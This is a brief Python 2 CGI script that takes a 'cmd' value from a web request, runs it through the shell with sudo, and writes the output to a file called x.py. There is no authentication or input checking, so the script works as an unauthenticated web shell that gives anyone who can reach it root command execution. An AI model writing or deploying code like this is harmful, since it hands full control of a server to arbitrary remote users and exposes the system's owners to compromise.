#!/usr/bin/python

import cgi,commands,sys
print "Content-type:text/html\r\n\r\n"
print ""

data=cgi.FieldStorage()
output=data.getvalue('cmd')

x=commands.getoutput('sudo '+output)
sys.stdout=open("x.py",'w')
print(x)
sys.stdout.close()
